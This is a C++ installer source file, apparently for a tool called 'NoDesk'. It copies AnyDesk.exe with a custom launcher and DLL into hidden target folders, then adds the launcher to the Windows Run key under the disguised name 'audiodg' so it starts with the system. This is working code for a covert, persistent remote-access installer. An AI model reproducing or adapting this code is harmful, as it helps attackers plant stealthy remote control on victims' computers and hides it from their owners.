﻿// NoDeskInstaller.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <cstdio>

#include "NoDesk/paths.h"
#include "NoDesk/strings.h"
#include "NoDesk/process.h"
#include "NoDesk/crypt.h"

void ConfigureStartup() {
	HKEY hKey;
	LSTATUS ret = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
	wprintf(L"CreateKey: %d\n", ret);
	RegSetValueExW(hKey, L"audiodg", 0, REG_SZ, (BYTE*)target_launcher, wcslenb(target_launcher));
	wprintf(L"SetValue: %d\n", ret);
}

void InstallFiles() {
	CreateDirectoryW(target_dir, NULL);
	CopyFileW(L"AnyDesk.exe", target_exe, FALSE);
	CopyFileW(L"NoDesk.exe", target_launcher, FALSE);
	CopyFileW(L"NoDeskRT.dll", target_dll, FALSE);

	CreateDirectoryW(config_dir, NULL);
	CopyFileW(L"service.conf", config_service, TRUE);
}

int main()
{
    GeneratePaths();

    wprintf(L"%s\n%s\n%s\n%s\n", target_dll, target_exe, target_launcher, config_service);
	std::string szHash;

	crypt::computeSHA256(L"NoDesk.exe", szHash);
	printf("Launcher: %s\n", szHash.c_str());
	crypt::computeSHA256(L"AnyDesk.exe", szHash);
	printf("AnyDesk.exe: %s\n", szHash.c_str());
	crypt::computeSHA256(L"NoDeskRT.dll", szHash);
	printf("NoDeskRT: %s\n", szHash.c_str());

	if (wcscmp(szCurName, L"NoDeskInstaller.exe") == 0) {
		wprintf(L"Go!\n");

		ConfigureStartup();
		InstallFiles();

		SimpleCreateProcess(target_launcher);

		system("pause");
		return 0;
	}
}
